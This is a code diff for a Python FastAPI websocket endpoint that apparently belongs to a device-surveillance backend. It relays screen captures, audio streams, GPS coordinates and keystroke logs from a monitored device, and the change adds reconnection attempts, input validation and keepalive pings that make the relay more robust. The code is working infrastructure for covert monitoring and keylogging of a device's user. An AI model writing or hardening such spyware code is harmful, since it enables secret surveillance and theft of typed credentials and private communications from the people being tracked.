@@ -35,56 +35,115 @@ manager = ConnectionManager()
 @router.websocket("/device/{device_id}/monitor")
 async def monitor_device(websocket: WebSocket, device_id: int, db: AsyncSession = Depends(get_db)):
     """WebSocket endpoint for real-time device monitoring"""
-    try:
-        await manager.connect(websocket, device_id)
-        
-        while True:
-            data = await websocket.receive_text()
-            try:
-                message = json.loads(data)
-                # Handle different types of monitoring data
-                if message.get("type") == "screen_capture":
-                    await manager.broadcast_to_device(
-                        json.dumps({
-                            "type": "screen_update",
-                            "data": message["data"],
+    connection_attempts = 0
+    max_attempts = 3
+    retry_delay = 5  # seconds
+
+    while connection_attempts < max_attempts:
+        try:
+            await manager.connect(websocket, device_id)
+            logger.info(f"Device {device_id} connected successfully")
+            
+            # Reset connection attempts on successful connection
+            connection_attempts = 0
+            
+            while True:
+                try:
+                    data = await asyncio.wait_for(websocket.receive_text(), timeout=30.0)
+                    try:
+                        message = json.loads(data)
+                        # Validate message structure
+                        if not isinstance(message, dict) or "type" not in message:
+                            raise ValueError("Invalid message structure")
+
+                        # Handle different types of monitoring data with validation
+                        if message["type"] == "screen_capture":
+                            if "data" not in message:
+                                raise ValueError("Missing data field in screen capture")
+                            await manager.broadcast_to_device(
+                                json.dumps({
+                                    "type": "screen_update",
+                                    "data": message["data"],
+                                    "timestamp": datetime.utcnow().isoformat(),
+                                    "status": "success"
+                                }),
+                                device_id
+                            )
+                        elif message["type"] == "audio_stream":
+                            if "data" not in message:
+                                raise ValueError("Missing data field in audio stream")
+                            await manager.broadcast_to_device(
+                                json.dumps({
+                                    "type": "audio_update",
+                                    "data": message["data"],
+                                    "timestamp": datetime.utcnow().isoformat(),
+                                    "status": "success"
+                                }),
+                                device_id
+                            )
+                        elif message["type"] == "gps_update":
+                            if "latitude" not in message or "longitude" not in message:
+                                raise ValueError("Missing coordinates in GPS update")
+                            await manager.broadcast_to_device(
+                                json.dumps({
+                                    "type": "location_update",
+                                    "latitude": message["latitude"],
+                                    "longitude": message["longitude"],
+                                    "timestamp": datetime.utcnow().isoformat(),
+                                    "status": "success"
+                                }),
+                                device_id
+                            )
+                        elif message["type"] == "keylog":
+                            if "data" not in message:
+                                raise ValueError("Missing data field in keylog")
+                            await manager.broadcast_to_device(
+                                json.dumps({
+                                    "type": "keylog_update",
+                                    "data": message["data"],
+                                    "timestamp": datetime.utcnow().isoformat(),
+                                    "status": "success"
+                                }),
+                                device_id
+                            )
+                        else:
+                            raise ValueError(f"Unknown message type: {message['type']}")
+                            
+                    except json.JSONDecodeError as e:
+                        logger.error(f"Invalid JSON format from device {device_id}: {str(e)}")
+                        await websocket.send_text(json.dumps({
+                            "type": "error",
+                            "message": "Invalid message format",
                             "timestamp": datetime.utcnow().isoformat()
-                        }),
-                        device_id
-                    )
-                elif message.get("type") == "audio_stream":
-                    await manager.broadcast_to_device(
-                        json.dumps({
-                            "type": "audio_update",
-                            "data": message["data"],
+                        }))
+                    except ValueError as e:
+                        logger.error(f"Validation error from device {device_id}: {str(e)}")
+                        await websocket.send_text(json.dumps({
+                            "type": "error",
+                            "message": str(e),
                             "timestamp": datetime.utcnow().isoformat()
-                        }),
-                        device_id
-                    )
-                elif message.get("type") == "gps_update":
-                    await manager.broadcast_to_device(
-                        json.dumps({
-                            "type": "location_update",
-                            "latitude": message["latitude"],
-                            "longitude": message["longitude"],
-                            "timestamp": datetime.utcnow().isoformat()
-                        }),
-                        device_id
-                    )
-                elif message.get("type") == "keylog":
-                    await manager.broadcast_to_device(
-                        json.dumps({
-                            "type": "keylog_update",
-                            "data": message["data"],
-                            "timestamp": datetime.utcnow().isoformat()
-                        }),
-                        device_id
-                    )
-            except json.JSONDecodeError:
-                await websocket.send_text("Invalid message format")
-                
-    except WebSocketDisconnect:
-        manager.disconnect(websocket, device_id)
+                        }))
+                except asyncio.TimeoutError:
+                    # Send ping to keep connection alive
+                    await websocket.send_text(json.dumps({
+                        "type": "ping",
+                        "timestamp": datetime.utcnow().isoformat()
+                    }))
+                    
+        except WebSocketDisconnect:
+            logger.warning(f"Device {device_id} disconnected")
+            manager.disconnect(websocket, device_id)
+            connection_attempts += 1
+            if connection_attempts < max_attempts:
+                logger.info(f"Attempting to reconnect device {device_id}. Attempt {connection_attempts + 1}/{max_attempts}")
+                await asyncio.sleep(retry_delay)
+            else:
+                logger.error(f"Failed to reconnect device {device_id} after {max_attempts} attempts")
+                break
+        except Exception as e:
+            logger.error(f"Unexpected error for device {device_id}: {str(e)}")
+            manager.disconnect(websocket, device_id)
+            break
 
 @router.websocket("/device/{device_id}/audio")
 async def audio_stream(websocket: WebSocket, device_id: int, db: AsyncSession = Depends(get_db)):
